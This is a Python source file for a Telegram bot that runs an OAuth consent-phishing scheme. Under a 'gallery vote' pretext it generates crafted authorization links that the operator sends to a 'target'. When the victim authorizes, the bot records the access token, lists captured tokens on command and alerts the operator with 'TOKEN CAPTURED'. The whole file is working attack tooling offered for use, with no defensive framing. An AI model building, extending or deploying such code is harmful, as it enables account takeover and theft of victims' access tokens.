import asyncio
import secrets
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from urllib.parse import urlencode
import config, store

bot = Bot(token=config.BOT_TOKEN)
dp  = Dispatcher()

def build_capture_link(label: str = "vote") -> tuple[str, str]:
    """
    Returns (auth_url, state).
    state ties the OAuth callback to this specific target session.
    """
    state = secrets.token_urlsafe(16)
    params = {
        "client_id":     config.GALLERY_CLIENT_ID,
        "redirect_uri":  f"{config.RENDER_URL}/oauth/callback",
        "response_type": "code",
        "scope":         config.GALLERY_SCOPES,
        "state":         state,
    }
    url = f"{config.GALLERY_AUTH_URL}?{urlencode(params)}"
    return url, state

@dp.message(Command("link"))
async def cmd_link(message: types.Message):
    """
    Operator runs /link [label]
    Bot returns a crafted authorization URL to send to target.
    """
    label = message.text.removeprefix("/link").strip() or "gallery vote"
    url, state = build_capture_link(label)

    kb = InlineKeyboardMarkup(inline_keyboard=[[
        InlineKeyboardButton(text="Copy link", callback_data=f"copy:{state}")
    ]])
    await message.answer(
        f"🎯 Capture link ready\n\n"
        f"`{url}`\n\n"
        f"State: `{state}`\n"
        f"Send this to target. When they click and authorize, token auto-captured.",
        parse_mode="Markdown",
        reply_markup=kb,
    )

@dp.message(Command("tokens"))
async def cmd_tokens(message: types.Message):
    """List all captured tokens."""
    all_tokens = store.list_tokens()
    if not all_tokens:
        await message.answer("No tokens captured yet.")
        return
    lines = []
    for state, data in all_tokens.items():
        access = data.get("access_token", "?")[:20]
        scope  = data.get("scope", "?")
        lines.append(f"• `{state}` → `{access}...` scope={scope}")
    await message.answer("\n".join(lines), parse_mode="Markdown")

async def notify_capture(state: str, token_data: dict):
    """Called by OAuth callback when a token lands."""
    # Operator chat ID -- set via /start or hardcode in env
    operator_id = int(config.__dict__.get("OPERATOR_ID", 0))
    if not operator_id:
        return
    access = token_data.get("access_token", "?")[:30]
    scope  = token_data.get("scope", "?")
    await bot.send_message(
        operator_id,
        f"🔑 TOKEN CAPTURED\n\nState: `{state}`\nAccess: `{access}...`\nScope: `{scope}`",
        parse_mode="Markdown",
    )
